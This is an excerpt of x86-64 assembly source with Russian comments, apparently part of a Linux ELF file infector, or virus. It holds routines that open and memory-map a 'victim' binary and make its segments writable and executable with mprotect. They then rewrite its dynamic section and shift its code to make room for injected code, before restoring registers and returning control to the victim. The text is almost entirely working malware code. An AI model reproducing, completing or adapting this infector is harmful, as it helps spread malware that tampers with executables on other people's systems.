	pop %r10
	pop %rbp
	pop %rdx
	pop %rcx
	pop %rbx

	ret


// MY_STAT
// @PARAMS
// %RDI - file name
// %RSI - stat struct pointer
_my_stat:
    // stat изменяет этот регистр
    // ~~~~~~~~~~~~~~~~~~~~~~~~~~
    // NB: Any syscall destroys %rcx and %r11
    // Почему это происходит?
    // Инструкция входа в режим ядра syscall
    // сохраняет в регистре RCX значение RIP,
    // а в R11 – значение регистра флагов и
    // переходит к выполнению функции ядра
    // (адрес которой хранится в специальном
    // Model Specific -регистре).
    // Инструкция sysret же выполняет всё наоборот:
    // восстанавливает RIP из регистра RCX и регистр
    // флагов (почти весь) из регистра R11.
    // Поскольку в x64 кол-во регистров довольно
    // много, а RCX и R11 не участвуют в передаче
    // параметров, создатели системы решили не
    // заморачиваться с сохранением этих регистров
    // (возможно, заодно и для ускорения системного
    // вызова и возврата)
    push    %rcx

    mov     $0x04, %rax
    syscall
    test    %rax, %rax
    jnz     _my_stat_error
_my_stat_exit:
    pop    %rcx
  	ret
    ERR_MSG _my_stat "my_stat"


/// OPENFILE
/// Открывает файл с указанными флагами,
/// маппит его в память
///
/// @PARAMS:
/// - %RDI - file name
/// - %RSI - flags
///
/// @RET:
/// - %RAX - указатель на файл в памяти
_openfile:
    push    %rbp
    mov     %rsp, %rbp

    mov     $0x2, %rax  # fopen syscall
    syscall
    test    %rax, %rax
    jl      _openfile_neg_fd_error

    // save all regs
    push    %rbx
    push    %rcx
    push    %rdx
    push    %r8
    push    %r9
    push    %r10

    leaq    fd(%rip), %rcx   # сохранить дескриптор жертвы
    mov     %rax, (%rcx)     # понадобится для перезаписи

    // space for local vars
    sub     $0xA0, %rsp

    mov     %rax, %rcx          # fd
    mov     %rsi, %rdx          # openfile flags

    // call stat
    // (need no less 0xA0 for struct stat)
    leaq    -0xA0(%rbp), %rsi   #  stat struct ptr
    call    _my_stat

    // prepare params for mmap
    mov     %rcx, %r8           # fd
    mov     %rdx, %rax          # flags
    xor     %rdi, %rdi          # addr

    // 0x70 - offset to filesz field in stat struct
    mov     -0x70(%rbp), %rsi   # filesz
    xor     %r9, %r9            # offset

    // doesn't need shared mmap
    mov     $MAP_PRIVATE, %rcx

    mov     $O_RDONLY, %rbx
    cmp     %rbx, %rax
    je      mmap_rdonly

    // define mmap flags
    mov     $O_RDWR, %rbx
    cmp     %rbx, %rax
    jne     _openfile_flags_error

mmap_rdwr:
    mov     $(PROT_READ | PROT_WRITE), %rdx # prot
    jmp     call_my_mmap

mmap_rdonly:
    mov     $PROT_READ, %rdx            # prot
    // call mmap
call_my_mmap:
    call    _my_mmap
    test    %rax, %rax
    jle     _openfile_ptr_error

    // recover stack
    add     $0xA0, %rsp
    pop     %r10
    pop     %r9
    pop     %r8
    pop     %rdx
    pop     %rcx
    pop     %rbx

_openfile_exit:
    pop     %rbp
	ret

    ERR_MSG _openfile_neg_fd "openfile neg fd"
    ERR_MSG _openfile_flags "openfile undefined flags"
    ERR_MSG _openfile_ptr "openfile returned zero ptr"

    // -------------------------------------------

// WRITE TO STDOUT
// @PARAMS
//   - %RSI - msg pointer
//   - %RDX - msg size
_my_write:
    mov     $0x1, %rax          # write
    mov     %rax, %rdi          # to stdout
    syscall
    ret

///  MY_MEMCPY
///   Побайтово записывает данный в размере bytesz
/// из памяти src в память dest

/// * @PARAMS
/// *   - %RDI - ptr dest
/// *   - %RSI - ptr src
/// *   - %RDX - bytesz

my_memcpy:

    pushq    %rcx
    pushq    %rax

    // loop cnt
    movq     %rdx, %rcx

cycle_my_memcpy:

    movq	 %rsi, %rax
    movb	 (%rax), %dl
    // movb 	%dl, %rdx

	movq	 %rdi, %rax
	movb	 %dl, (%rax)

    inc      %rdi
    inc      %rsi

    loop     cycle_my_memcpy

my_memcpy_exit:
    popq     %rax
    popq     %rcx

    ret


_move_victim:
    push    %rax
    push    %rdx
    push    %rdi
    push    %rsi

    lea     _exit_victim(%rip), %rdi
    // add     $0xB, %rdi
    add     $0x23, %rdi

    // разрешаем редактировать dynamic
_mprotect_for_dynamic:
    // mov     (%rdi), %rsi  # dynamic_vaddr

    // add     $0x8, %rdi    # dynamic_size
    // mov     (%rdi), %rax

    // add     %rax, %rsi    # end vaddr

    // sub     $0x8, %rdi
    // mov     (%rdi), %rdi  # begin vaddr


    mov     (%rdi), %rsi  # last_seg_vaddr_end

    add     $0x10, %rdi
    mov     (%rdi),%rdi

    and     $~0xFFF, %rdi  # ..in %RDI
    sub     %rdi, %rsi

    mov     $0x7, %rdx   # RW+EXEC flags - $RDX
    mov     $0xA, %rax   # mprotect handle
    syscall

    test    %rax, %rax
    jne     _exit_virus

    // редактируем dynamic
    leaq    _exit_victim(%rip), %rax
    add     $0xB, %rax  # пропустили блок передачи
                        # управления

    mov     (%rax), %rdi # dynamic_records_vaddr

    mov     $-0x38, %rsi # const

    add     $0x8, %rax   # dynamic_records_size
    mov     (%rax), %rdx

    add     $0x8, %rax   # first_seg_vaddr
    mov     (%rax), %rcx

    call    _recount_dynamic_section

    // add     $0x8, %rax
    // mov     (%rax), %rdi
    // mov     $-0x38, %rsi
    // add     $0x8, %rax
    // mov     (%rax), %rdx

    // call    _recount_symbols_addrs

_mprotect_for_victim:
    lea     _exit_victim(%rip), %rdi
    add     $0x23, %rdi

    mov     (%rdi), %rsi  # victim_code sz
    add     $0x38, %rsi

    add     $0x8, %rdi    # victim_code vaddr
    add     (%rdi), %rsi  # end vaddr

    mov     (%rdi), %rdi  # begin vaddr

    and     $~0xFFF, %rdi  # ..in %RDI
    sub     %rdi, %rsi

    mov     $0x7, %rdx   # RW+EXEC flags - $RDX
    mov     $0xA, %rax   # mprotect handle
    syscall

    test    %rax, %rax
    jne     _exit_virus

    lea     _exit_victim(%rip), %rax
    add     $0x23, %rax

    // сдвигаем жертву
    mov     (%rax), %rdx   # code size
    add     $0x38, %rdx

    add     $0x8, %rax  # victim code begin before
    mov     (%rax), %rdi

    mov     (%rax), %rsi # victim code begin now
    add     $0x38, %rsi

    call    my_memcpy

	pop     %rsi
	pop     %rdi
	pop     %rdx
    pop     %rax

    ret

_exit_virus:
    mov $0x3c, %rax
    mov $0x0,  %rdi
    syscall

// ERROR HANDLING
// @PARAMS
//   - %RSI - msg pointer
//   - %RDX - msg size
_error_msg:
    .ifdef DEBUG_MODE
    call    _my_write
    .endif
    jmp _end_infector

_end_infector:
    mov     old_rsp(%rip), %rsp     # restore old %RSP
    // jmp     _start_victim

    mov     old_rax(%rip), %rax
    mov     old_rbx(%rip), %rbx
    mov     old_rdx(%rip), %rdx
    mov     old_rcx(%rip), %rcx
    mov     old_rdi(%rip), %rdi
    mov     old_rsi(%rip), %rsi
    mov     old_r8(%rip), %r8
    mov     old_r9(%rip), %r9
    mov     old_r10(%rip), %r10
    mov     old_r11(%rip), %r11
    mov     old_r12(%rip), %r12
    mov     old_r13(%rip), %r13
    mov     old_r14(%rip), %r14
    mov     old_r15(%rip), %r15

_exit_victim:
    mov $0x3c, %rax
    mov $0x0,  %rdi
    syscall

_fin_infector:
    nop
